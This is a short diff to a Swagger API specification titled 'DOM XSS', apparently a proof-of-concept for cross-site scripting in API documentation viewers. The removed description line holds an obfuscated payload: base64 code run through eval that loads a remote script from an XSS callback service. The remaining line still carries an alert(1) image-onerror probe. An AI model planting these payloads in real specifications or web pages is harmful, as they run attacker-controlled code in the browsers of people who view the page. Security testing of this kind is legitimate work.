@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: DOM XSS
-  description: '<img src=x onerror=alert(1)><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL25vMXhqb2hud2ljayI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>'
+  description: '<img src=x onerror=alert(1)>'
 paths:
   /:
     post:
